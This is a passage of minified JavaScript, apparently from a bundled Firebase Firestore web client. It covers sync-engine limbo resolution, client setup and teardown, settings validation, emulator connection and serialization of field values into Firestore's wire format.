d.mutationQueue.lookupMutationBatch(p,u).next((h=>(Aa(h!==null,37113),f=h.keys(),d.mutationQueue.removeMutationBatch(p,h)))).next((()=>d.mutationQueue.performConsistencyCheck(p))).next((()=>d.documentOverlayCache.removeOverlaysForBatchId(p,f,u))).next((()=>d.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(p,f))).next((()=>d.localDocuments.getDocuments(p,f)))}))})(n.localStore,e);kw(n,e,t),qw(n,e),n.sharedClientState.updateMutationState(e,"rejected",t),await Tp(n,i)}catch(i){await Vc(i)}}function qw(a,e){(a.mu.get(e)||[]).forEach((t=>{t.resolve()})),a.mu.delete(e)}function kw(a,e,t){const n=$e(a);let i=n.du[n.currentUser.toKey()];if(i){const r=i.get(e);r&&(t?r.reject(t):r.resolve(),i=i.remove(e)),n.du[n.currentUser.toKey()]=i}}function u0(a,e,t=null){a.sharedClientState.removeLocalQueryTarget(e);for(const n of a.Iu.get(e))a.Tu.delete(n),t&&a.Pu.yu(n,t);a.Iu.delete(e),a.isPrimaryClient&&a.Vu.Gr(e).forEach((n=>{a.Vu.containsKey(n)||Ow(a,n)}))}function Ow(a,e){a.Eu.delete(e.path.canonicalString());const t=a.Ru.get(e);t!==null&&(DE(a.remoteStore,t),a.Ru=a.Ru.remove(e),a.Au.delete(t),zE(a))}function P2(a,e,t){for(const n of t)n instanceof Dw?(a.Vu.addReference(n.key,e),$6(a,n)):n instanceof Mw?(De(UE,"Document no longer in limbo: "+n.key),a.Vu.removeReference(n.key,e),a.Vu.containsKey(n.key)||Ow(a,n.key)):Ge(19791,{wu:n})}function $6(a,e){const t=e.key,n=t.path.canonicalString();a.Ru.get(t)||a.Eu.has(n)||(De(UE,"New document in limbo: "+t),a.Eu.add(n),zE(a))}function zE(a){for(;a.Eu.size>0&&a.Ru.size<a.maxConcurrentLimboResolutions;){const e=a.Eu.values().next().value;a.Eu.delete(e);const t=new Be(Qa.fromString(e)),n=a.fu.next();a.Au.set(n,new z6(t)),a.Ru=a.Ru.insert(t,n),Tw(a.remoteStore,new Bs(no($h(t.path)),n,"TargetPurposeLimboResolution",Jh.ce))}}async function Tp(a,e,t){const n=$e(a),i=[],r=[],l=[];n.Tu.isEmpty()||(n.Tu.forEach(((u,d)=>{l.push(n.pu(d,e,t).then((p=>{if((p||t)&&n.isPrimaryClient){const f=p?!p.fromCache:t?.targetChanges.get(d.targetId)?.current;n.sharedClientState.updateQueryState(d.targetId,f?"current":"not-current")}if(p){i.push(p);const f=wE.Es(d.targetId,p);r.push(f)}})))})),await Promise.all(l),n.Pu.J_(i),await(async function(d,p){const f=$e(d);try{await f.persistence.runTransaction("notifyLocalViewChanges","readwrite",(h=>ve.forEach(p,(E=>ve.forEach(E.Ts,(C=>f.persistence.referenceDelegate.addReference(h,E.targetId,C))).next((()=>ve.forEach(E.Is,(C=>f.persistence.referenceDelegate.removeReference(h,E.targetId,C)))))))))}catch(h){if(!Hc(h))throw h;De(jE,"Failed to update sequence numbers: "+h)}for(const h of p){const E=h.targetId;if(!h.fromCache){const C=f.vs.get(E),A=C.snapshotVersion,j=C.withLastLimboFreeSnapshotVersion(A);f.vs=f.vs.insert(E,j)}}})(n.localStore,r))}async function X6(a,e){const t=$e(a);if(!t.currentUser.isEqual(e)){De(UE,"User change. New user:",e.toKey());const n=await yw(t.localStore,e);t.currentUser=e,(function(r,l){r.mu.forEach((u=>{u.forEach((d=>{d.reject(new ke(Se.CANCELLED,l))}))})),r.mu.clear()})(t,"'waitForPendingWrites' promise is rejected due to a user change."),t.sharedClientState.handleUserChange(e,n.removedBatchIds,n.addedBatchIds),await Tp(t,n.Ns)}}function Z6(a,e){const t=$e(a),n=t.Au.get(e);if(n&&n.hu)return pa().add(n.key);{let i=pa();const r=t.Iu.get(e);if(!r)return i;for(const l of r){const u=t.Tu.get(l);i=i.unionWith(u.view.nu)}return i}}function Uw(a){const e=$e(a);return e.remoteStore.remoteSyncer.applyRemoteEvent=_w.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=Z6.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=W6.bind(null,e),e.Pu.J_=q6.bind(null,e.eventManager),e.Pu.yu=k6.bind(null,e.eventManager),e}function ez(a){const e=$e(a);return e.remoteStore.remoteSyncer.applySuccessfulWrite=K6.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=Y6.bind(null,e),e}class yh{constructor(){this.kind="memory",this.synchronizeTabs=!1}async initialize(e){this.serializer=ng(e.databaseInfo.databaseId),this.sharedClientState=this.Du(e),this.persistence=this.Cu(e),await this.persistence.start(),this.localStore=this.vu(e),this.gcScheduler=this.Fu(e,this.localStore),this.indexBackfillerScheduler=this.Mu(e,this.localStore)}Fu(e,t){return null}Mu(e,t){return null}vu(e){return n6(this.persistence,new e6,e.initialUser,this.serializer)}Cu(e){return new vw(IE.Vi,this.serializer)}Du(e){return new u6}async terminate(){this.gcScheduler?.stop(),this.indexBackfillerScheduler?.stop(),this.sharedClientState.shutdown(),await this.persistence.shutdown()}}yh.provider={build:()=>new yh};class az extends yh{constructor(e){super(),this.cacheSizeBytes=e}Fu(e,t){Aa(this.persistence.referenceDelegate instanceof bh,46915);const n=this.persistence.referenceDelegate.garbageCollector;return new UU(n,e.asyncQueue,t)}Cu(e){const t=this.cacheSizeBytes!==void 0?hn.withCacheSize(this.cacheSizeBytes):hn.DEFAULT;return new vw((n=>bh.Vi(n,t)),this.serializer)}}class d0{async initialize(e,t){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(t),this.remoteStore=this.createRemoteStore(t),this.eventManager=this.createEventManager(t),this.syncEngine=this.createSyncEngine(t,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=n=>A2(this.syncEngine,n,1),this.remoteStore.remoteSyncer.handleCredentialChange=X6.bind(null,this.syncEngine),await M6(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return(function(){return new _6})()}createDatastore(e){const t=ng(e.databaseInfo.databaseId),n=h6(e.databaseInfo);return E6(e.authCredentials,e.appCheckCredentials,n,t)}createRemoteStore(e){return(function(n,i,r,l,u){return new C6(n,i,r,l,u)})(this.localStore,this.datastore,e.asyncQueue,(t=>A2(this.syncEngine,t,0)),(function(){return y2.v()?new y2:new d6})())}createSyncEngine(e,t){return(function(i,r,l,u,d,p,f){const h=new B6(i,r,l,u,d,p);return f&&(h.gu=!0),h})(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,t)}async terminate(){await(async function(t){const n=$e(t);De(rl,"RemoteStore shutting down."),n.Ea.add(5),await Cp(n),n.Aa.shutdown(),n.Va.set("Unknown")})(this.remoteStore),this.datastore?.terminate(),this.eventManager?.terminate()}}d0.provider={build:()=>new d0};class zw{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.Ou(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.Ou(this.observer.error,e):Jo("Uncaught Error in snapshot listener:",e.toString()))}Nu(){this.muted=!0}Ou(e,t){setTimeout((()=>{this.muted||e(t)}),0)}}const tr="FirestoreClient";class tz{constructor(e,t,n,i,r){this.authCredentials=e,this.appCheckCredentials=t,this.asyncQueue=n,this._databaseInfo=i,this.user=Vt.UNAUTHENTICATED,this.clientId=bE.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=r,this.authCredentials.start(n,(async l=>{De(tr,"Received user=",l.uid),await this.authCredentialListener(l),this.user=l})),this.appCheckCredentials.start(n,(l=>(De(tr,"Received new app check token=",l),this.appCheckCredentialListener(l,this.user))))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this._databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();const e=new Ws;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted((async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(t){const n=kE(t,"Failed to shutdown persistence");e.reject(n)}})),e.promise}}async function Jv(a,e){a.asyncQueue.verifyOperationInProgress(),De(tr,"Initializing OfflineComponentProvider");const t=a.configuration;await e.initialize(t);let n=t.initialUser;a.setCredentialChangeListener((async i=>{n.isEqual(i)||(await yw(e.localStore,i),n=i)})),e.persistence.setDatabaseDeletedListener((()=>a.terminate())),a._offlineComponents=e}async function L2(a,e){a.asyncQueue.verifyOperationInProgress();const t=await nz(a);De(tr,"Initializing OnlineComponentProvider"),await e.initialize(t,a.configuration),a.setCredentialChangeListener((n=>S2(e.remoteStore,n))),a.setAppCheckTokenChangeListener(((n,i)=>S2(e.remoteStore,i))),a._onlineComponents=e}async function nz(a){if(!a._offlineComponents)if(a._uninitializedComponentsProvider){De(tr,"Using user provided OfflineComponentProvider");try{await Jv(a,a._uninitializedComponentsProvider._offline)}catch(e){const t=e;if(!(function(i){return i.name==="FirebaseError"?i.code===Se.FAILED_PRECONDITION||i.code===Se.UNIMPLEMENTED:!(typeof DOMException<"u"&&i instanceof DOMException)||i.code===22||i.code===20||i.code===11})(t))throw t;sl("Error using user provided cache. Falling back to memory cache: "+t),await Jv(a,new yh)}}else De(tr,"Using default OfflineComponentProvider"),await Jv(a,new az(void 0));return a._offlineComponents}async function Bw(a){return a._onlineComponents||(a._uninitializedComponentsProvider?(De(tr,"Using user provided OnlineComponentProvider"),await L2(a,a._uninitializedComponentsProvider._online)):(De(tr,"Using default OnlineComponentProvider"),await L2(a,new d0))),a._onlineComponents}function iz(a){return Bw(a).then((e=>e.syncEngine))}async function p0(a){const e=await Bw(a),t=e.eventManager;return t.onListen=F6.bind(null,e.syncEngine),t.onUnlisten=G6.bind(null,e.syncEngine),t.onFirstRemoteStoreListen=V6.bind(null,e.syncEngine),t.onLastRemoteStoreUnlisten=Q6.bind(null,e.syncEngine),t}function oz(a,e,t,n){const i=new zw(n),r=new jw(e,i,t);return a.asyncQueue.enqueueAndForget((async()=>Iw(await p0(a),r))),()=>{i.Nu(),a.asyncQueue.enqueueAndForget((async()=>ww(await p0(a),r)))}}function sz(a,e,t={}){const n=new Ws;return a.asyncQueue.enqueueAndForget((async()=>(function(r,l,u,d,p){const f=new zw({next:E=>{f.Nu(),l.enqueueAndForget((()=>ww(r,h)));const C=E.docs.has(u);!C&&E.fromCache?p.reject(new ke(Se.UNAVAILABLE,"Failed to get document because the client is offline.")):C&&E.fromCache&&d&&d.source==="server"?p.reject(new ke(Se.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):p.resolve(E)},error:E=>p.reject(E)}),h=new jw($h(u.path),f,{includeMetadataChanges:!0,Ka:!0});return Iw(r,h)})(await p0(a),a.asyncQueue,e,t,n))),n.promise}function rz(a,e){const t=new Ws;return a.asyncQueue.enqueueAndForget((async()=>J6(await iz(a),e,t))),t.promise}function Fw(a){const e={};return a.timeoutSeconds!==void 0&&(e.timeoutSeconds=a.timeoutSeconds),e}const lz="ComponentProvider",R2=new Map;function cz(a,e,t,n,i){return new I5(a,e,t,i.host,i.ssl,i.experimentalForceLongPolling,i.experimentalAutoDetectLongPolling,Fw(i.experimentalLongPollingOptions),i.useFetchStreams,i.isUsingEmulator,n)}const Vw="firestore.googleapis.com",I2=!0;class w2{constructor(e){if(e.host===void 0){if(e.ssl!==void 0)throw new ke(Se.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host=Vw,this.ssl=I2}else this.host=e.host,this.ssl=e.ssl??I2;if(this.isUsingEmulator=e.emulatorOptions!==void 0,this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=bw;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<kU)throw new ke(Se.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}v5("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=Fw(e.experimentalLongPollingOptions??{}),(function(n){if(n.timeoutSeconds!==void 0){if(isNaN(n.timeoutSeconds))throw new ke(Se.INVALID_ARGUMENT,`invalid long polling timeout: ${n.timeoutSeconds} (must not be NaN)`);if(n.timeoutSeconds<5)throw new ke(Se.INVALID_ARGUMENT,`invalid long polling timeout: ${n.timeoutSeconds} (minimum allowed value is 5)`);if(n.timeoutSeconds>30)throw new ke(Se.INVALID_ARGUMENT,`invalid long polling timeout: ${n.timeoutSeconds} (maximum allowed value is 30)`)}})(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&(function(n,i){return n.timeoutSeconds===i.timeoutSeconds})(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class BE{constructor(e,t,n,i){this._authCredentials=e,this._appCheckCredentials=t,this._databaseId=n,this._app=i,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new w2({}),this._settingsFrozen=!1,this._emulatorOptions={},this._terminateTask="notTerminated"}get app(){if(!this._app)throw new ke(Se.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new ke(Se.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new w2(e),this._emulatorOptions=e.emulatorOptions||{},e.credentials!==void 0&&(this._authCredentials=(function(n){if(!n)return new r5;switch(n.type){case"firstParty":return new d5(n.sessionIndex||"0",n.iamToken||null,n.authTokenFactory||null);case"provider":return n.client;default:throw new ke(Se.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}})(e.credentials))}_getSettings(){return this._settings}_getEmulatorOptions(){return this._emulatorOptions}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask==="notTerminated"&&(this._terminateTask=this._terminate()),this._terminateTask}async _restart(){this._terminateTask==="notTerminated"?await this._terminate():this._terminateTask="notTerminated"}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return(function(t){const n=R2.get(t);n&&(De(lz,"Removing Datastore"),R2.delete(t),n.terminate())})(this),Promise.resolve()}}function uz(a,e,t,n={}){a=Ks(a,BE);const i=zc(e),r=a._getSettings(),l={...r,emulatorOptions:a._getEmulatorOptions()},u=`${e}:${t}`;i&&(fI(`https://${u}`),hI("Firestore",!0)),r.host!==Vw&&r.host!==u&&sl("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used.");const d={...r,host:u,ssl:i,emulatorOptions:n};if(!nl(d,l)&&(a._setSettings(d),n.mockUserToken)){let p,f;if(typeof n.mockUserToken=="string")p=n.mockUserToken,f=Vt.MOCK_USER;else{p=MO(n.mockUserToken,a._app?.options.projectId);const h=n.mockUserToken.sub||n.mockUserToken.user_id;if(!h)throw new ke(Se.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");f=new Vt(h)}a._authCredentials=new l5(new II(p,f))}}class sg{constructor(e,t,n){this.converter=t,this._query=n,this.type="query",this.firestore=e}withConverter(e){return new sg(this.firestore,e,this._query)}}class yt{constructor(e,t,n){this.converter=t,this._key=n,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new np(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new yt(this.firestore,e,this._key)}toJSON(){return{type:yt._jsonSchemaVersion,referencePath:this._key.toString()}}static fromJSON(e,t,n){if(yp(t,yt._jsonSchema))return new yt(e,n||null,new Be(Qa.fromString(t.referencePath)))}}yt._jsonSchemaVersion="firestore/documentReference/1.0",yt._jsonSchema={type:ft("string",yt._jsonSchemaVersion),referencePath:ft("string")};class np extends sg{constructor(e,t,n){super(e,t,$h(n)),this._path=n,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new yt(this.firestore,null,new Be(e))}withConverter(e){return new np(this.firestore,e,this._path)}}function Eh(a,e,...t){if(a=bn(a),arguments.length===1&&(e=bE.newId()),b5("doc","path",e),a instanceof BE){const n=Qa.fromString(e,...t);return HA(n),new yt(a,null,new Be(n))}{if(!(a instanceof yt||a instanceof np))throw new ke(Se.INVALID_ARGUMENT,"Expected first argument to doc() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const n=a._path.child(Qa.fromString(e,...t));return HA(n),new yt(a.firestore,a instanceof np?a.converter:null,new Be(n))}}const j2="AsyncQueue";class D2{constructor(e=Promise.resolve()){this.Yu=[],this.ec=!1,this.tc=[],this.nc=null,this.rc=!1,this.sc=!1,this.oc=[],this.M_=new Sw(this,"async_queue_retry"),this._c=()=>{const n=Qv();n&&De(j2,"Visibility state changed to "+n.visibilityState),this.M_.w_()},this.ac=e;const t=Qv();t&&typeof t.addEventListener=="function"&&t.addEventListener("visibilitychange",this._c)}get isShuttingDown(){return this.ec}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.uc(),this.cc(e)}enterRestrictedMode(e){if(!this.ec){this.ec=!0,this.sc=e||!1;const t=Qv();t&&typeof t.removeEventListener=="function"&&t.removeEventListener("visibilitychange",this._c)}}enqueue(e){if(this.uc(),this.ec)return new Promise((()=>{}));const t=new Ws;return this.cc((()=>this.ec&&this.sc?Promise.resolve():(e().then(t.resolve,t.reject),t.promise))).then((()=>t.promise))}enqueueRetryable(e){this.enqueueAndForget((()=>(this.Yu.push(e),this.lc())))}async lc(){if(this.Yu.length!==0){try{await this.Yu[0](),this.Yu.shift(),this.M_.reset()}catch(e){if(!Hc(e))throw e;De(j2,"Operation failed with retryable error: "+e)}this.Yu.length>0&&this.M_.p_((()=>this.lc()))}}cc(e){const t=this.ac.then((()=>(this.rc=!0,e().catch((n=>{throw this.nc=n,this.rc=!1,Jo("INTERNAL UNHANDLED ERROR: ",M2(n)),n})).then((n=>(this.rc=!1,n))))));return this.ac=t,t}enqueueAfterDelay(e,t,n){this.uc(),this.oc.indexOf(e)>-1&&(t=0);const i=qE.createAndSchedule(this,e,t,n,(r=>this.hc(r)));return this.tc.push(i),i}uc(){this.nc&&Ge(47125,{Pc:M2(this.nc)})}verifyOperationInProgress(){}async Tc(){let e;do e=this.ac,await e;while(e!==this.ac)}Ic(e){for(const t of this.tc)if(t.timerId===e)return!0;return!1}Ec(e){return this.Tc().then((()=>{this.tc.sort(((t,n)=>t.targetTimeMs-n.targetTimeMs));for(const t of this.tc)if(t.skipDelay(),e!=="all"&&t.timerId===e)break;return this.Tc()}))}Rc(e){this.oc.push(e)}hc(e){const t=this.tc.indexOf(e);this.tc.splice(t,1)}}function M2(a){let e=a.message||"";return a.stack&&(e=a.stack.includes(a.message)?a.stack:a.message+`
`+a.stack),e}class ip extends BE{constructor(e,t,n,i){super(e,t,n,i),this.type="firestore",this._queue=new D2,this._persistenceKey=i?.name||"[DEFAULT]"}async _terminate(){if(this._firestoreClient){const e=this._firestoreClient.terminate();this._queue=new D2(e),this._firestoreClient=void 0,await e}}}function dz(a,e){const t=typeof a=="object"?a:yI(),n=typeof a=="string"?a:uh,i=hE(t,"firestore").getImmediate({identifier:n});if(!i._initialized){const r=jO("firestore");r&&uz(i,...r)}return i}function FE(a){if(a._terminated)throw new ke(Se.FAILED_PRECONDITION,"The client has already been terminated.");return a._firestoreClient||pz(a),a._firestoreClient}function pz(a){const e=a._freezeSettings(),t=cz(a._databaseId,a._app?.options.appId||"",a._persistenceKey,a._app?.options.apiKey,e);a._componentsProvider||e.localCache?._offlineComponentProvider&&e.localCache?._onlineComponentProvider&&(a._componentsProvider={_offline:e.localCache._offlineComponentProvider,_online:e.localCache._onlineComponentProvider}),a._firestoreClient=new tz(a._authCredentials,a._appCheckCredentials,a._queue,t,a._componentsProvider&&(function(i){const r=i?._online.build();return{_offline:i?._offline.build(r),_online:r}})(a._componentsProvider))}class $n{constructor(e){this._byteString=e}static fromBase64String(e){try{return new $n(Ut.fromBase64String(e))}catch(t){throw new ke(Se.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+t)}}static fromUint8Array(e){return new $n(Ut.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}toJSON(){return{type:$n._jsonSchemaVersion,bytes:this.toBase64()}}static fromJSON(e){if(yp(e,$n._jsonSchema))return $n.fromBase64String(e.bytes)}}$n._jsonSchemaVersion="firestore/bytes/1.0",$n._jsonSchema={type:ft("string",$n._jsonSchemaVersion),bytes:ft("string")};class Hw{constructor(...e){for(let t=0;t<e.length;++t)if(e[t].length===0)throw new ke(Se.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new Ot(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}class Gw{constructor(e){this._methodName=e}}class oo{constructor(e,t){if(!isFinite(e)||e<-90||e>90)throw new ke(Se.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(t)||t<-180||t>180)throw new ke(Se.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+t);this._lat=e,this._long=t}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}_compareTo(e){return da(this._lat,e._lat)||da(this._long,e._long)}toJSON(){return{latitude:this._lat,longitude:this._long,type:oo._jsonSchemaVersion}}static fromJSON(e){if(yp(e,oo._jsonSchema))return new oo(e.latitude,e.longitude)}}oo._jsonSchemaVersion="firestore/geoPoint/1.0",oo._jsonSchema={type:ft("string",oo._jsonSchemaVersion),latitude:ft("number"),longitude:ft("number")};class Ei{constructor(e){this._values=(e||[]).map((t=>t))}toArray(){return this._values.map((e=>e))}isEqual(e){return(function(n,i){if(n.length!==i.length)return!1;for(let r=0;r<n.length;++r)if(n[r]!==i[r])return!1;return!0})(this._values,e._values)}toJSON(){return{type:Ei._jsonSchemaVersion,vectorValues:this._values}}static fromJSON(e){if(yp(e,Ei._jsonSchema)){if(Array.isArray(e.vectorValues)&&e.vectorValues.every((t=>typeof t=="number")))return new Ei(e.vectorValues);throw new ke(Se.INVALID_ARGUMENT,"Expected 'vectorValues' field to be a number array")}}}Ei._jsonSchemaVersion="firestore/vectorValue/1.0",Ei._jsonSchema={type:ft("string",Ei._jsonSchemaVersion),vectorValues:ft("object")};const mz=/^__.*__$/;class fz{constructor(e,t,n){this.data=e,this.fieldMask=t,this.fieldTransforms=n}toMutation(e,t){return this.fieldMask!==null?new ml(e,this.data,this.fieldMask,t,this.fieldTransforms):new Ep(e,this.data,t,this.fieldTransforms)}}function Qw(a){switch(a){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw Ge(40011,{dataSource:a})}}class VE{constructor(e,t,n,i,r,l){this.settings=e,this.databaseId=t,this.serializer=n,this.ignoreUndefinedProperties=i,r===void 0&&this.validatePath(),this.fieldTransforms=r||[],this.fieldMask=l||[]}get path(){return this.settings.path}get dataSource(){return this.settings.dataSource}contextWith(e){return new VE({...this.settings,...e},this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}childContextForField(e){const t=this.path?.child(e),n=this.contextWith({path:t,arrayElement:!1});return n.validatePathSegment(e),n}childContextForFieldPath(e){const t=this.path?.child(e),n=this.contextWith({path:t,arrayElement:!1});return n.validatePath(),n}childContextForArray(e){return this.contextWith({path:void 0,arrayElement:!0})}createError(e){return Sh(e,this.settings.methodName,this.settings.hasConverter||!1,this.path,this.settings.targetDoc)}contains(e){return this.fieldMask.find((t=>e.isPrefixOf(t)))!==void 0||this.fieldTransforms.find((t=>e.isPrefixOf(t.field)))!==void 0}validatePath(){if(this.path)for(let e=0;e<this.path.length;e++)this.validatePathSegment(this.path.get(e))}validatePathSegment(e){if(e.length===0)throw this.createError("Document fields must not be empty");if(Qw(this.dataSource)&&mz.test(e))throw this.createError('Document fields cannot begin and end with "__"')}}class hz{constructor(e,t,n){this.databaseId=e,this.ignoreUndefinedProperties=t,this.serializer=n||ng(e)}createContext(e,t,n,i=!1){return new VE({dataSource:e,methodName:t,targetDoc:n,path:Ot.emptyPath(),arrayElement:!1,hasConverter:i},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function gz(a){const e=a._freezeSettings(),t=ng(a._databaseId);return new hz(a._databaseId,!!e.ignoreUndefinedProperties,t)}function bz(a,e,t,n,i,r={}){const l=a.createContext(r.merge||r.mergeFields?2:0,e,t,i);Yw("Data must be an object, but it was:",l,n);const u=Ww(n,l);let d,p;if(r.merge)d=new bi(l.fieldMask),p=l.fieldTransforms;else if(r.mergeFields){const f=[];for(const h of r.mergeFields){const E=HE(e,h,t);if(!l.contains(E))throw new ke(Se.INVALID_ARGUMENT,`Field '${E}' is specified in your field mask but missing from your input data.`);Ez(f,E)||f.push(E)}d=new bi(f),p=l.fieldTransforms.filter((h=>d.covers(h.field)))}else d=null,p=l.fieldTransforms;return new fz(new Yn(u),d,p)}function Jw(a,e){if(Kw(a=bn(a)))return Yw("Unsupported field value:",e,a),Ww(a,e);if(a instanceof Gw)return(function(n,i){if(!Qw(i.dataSource))throw i.createError(`${n._methodName}() can only be used with update() and set()`);if(!i.path)throw i.createError(`${n._methodName}() is not currently supported inside arrays`);const r=n._toFieldTransform(i);r&&i.fieldTransforms.push(r)})(a,e),null;if(a===void 0&&e.ignoreUndefinedProperties)return null;if(e.path&&e.fieldMask.push(e.path),a instanceof Array){if(e.settings.arrayElement&&e.dataSource!==4)throw e.createError("Nested arrays are not supported");return(function(n,i){const r=[];let l=0;for(const u of n){let d=Jw(u,i.childContextForArray(l));d==null&&(d={nullValue:"NULL_VALUE"}),r.push(d),l++}return{arrayValue:{values:r}}})(a,e)}return(function(n,i){if((n=bn(n))===null)return{nullValue:"NULL_VALUE"};if(typeof n=="number")return aU(i.serializer,n);if(typeof n=="boolean")return{booleanValue:n};if(typeof n=="string")return{stringValue:n};if(n instanceof Date){const r=Ua.fromDate(n);return{timestampValue:gh(i.serializer,r)}}if(n instanceof Ua){const r=new Ua(n.seconds,1e3*Math.floor(n.nanoseconds/1e3));return{timestampValue:gh(i.serializer,r)}}if(n instanceof oo)return{geoPointValue:{latitude:n.latitude,longitude:n.longitude}};if(n instanceof $n)return{bytesValue:cw(i.serializer,n._byteString)};if(n instanceof yt){const r=i.databaseId,l=n.firestore._databaseId;if(!l.isEqual(r))throw i.createError(`Document reference is for database ${l.projectId}/${l.database} but should be for database ${r.projectId}/${r.database}`);return{referenceValue:LE(n.firestore._databaseId||i.databaseId,n._key.path)}}if(n instanceof Ei)return(function(l,u){const d=l instanceof Ei?l.toArray():l;return{mapValue:{fields:{[OI]:{stringValue:UI},[dh]:{arrayValue:{values:d.map((f=>{if(typeof f!="number")throw u.createError("VectorValues must only contain numeric values.");return xE(u.serializer,f)}))}}}}}})(n,i);if(gw(n))return n._toProto(i.serializer);throw i.createError(`Unsupported field value: ${vE(n)}`)})(a,e)}function Ww(a,e){const t={};return DI(a)?e.path&&e.path.length>0&&e.fieldMask.push(e.path):dl(a,((n,i)=>{const r=Jw(i,e.childContextForField(n));r!=null&&(t[n]=r)})),{mapValue:{fields:t}}}function Kw(a){return!(typeof a!="object"||a===null||a instanceof Array||a instanceof Date||a instanceof Ua||a instanceof oo||a instanceof $n||a instanceof yt||a instanceof Gw||a instanceof Ei||gw(a))}function Yw(a,e,t){if(!Kw(t)||!wI(t)){const n=vE(t);throw n==="an object"?e.createError(a+" a custom object"):e.createError(a+" "+n)}}function HE(a,e,t){if((e=bn(e))instanceof Hw)return e._internalPath;if(typeof e=="string")return yz(a,e);throw Sh("Field path arguments must be of type string or ",a,!1,void 0,t)}const vz=new RegExp("[~\\*/\\[\\]]");function yz(a,e,t){if(e.search(vz)>=0)throw Sh(`Invalid field path (${e}). Paths must not contain '~', '*', '/', '[', or ']'`,a,!1,void 0,t);try{return new Hw(...e.split("."))._internalPath}catch{throw Sh(`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,a,!1,void 0,t)}}function Sh(a,e,t,n,i){const r=n&&!n.isEmpty(),l=i!==void 0;let u=`Function ${e}() called with invalid data`;t&&(u+=" (via `toFirestore()`)"),u+=". ";let d="";return(r||l)&&(d+=" (found",r&&(d+=` in field ${n}`),l&&(d+=` in document ${i}`),d+=")"),new 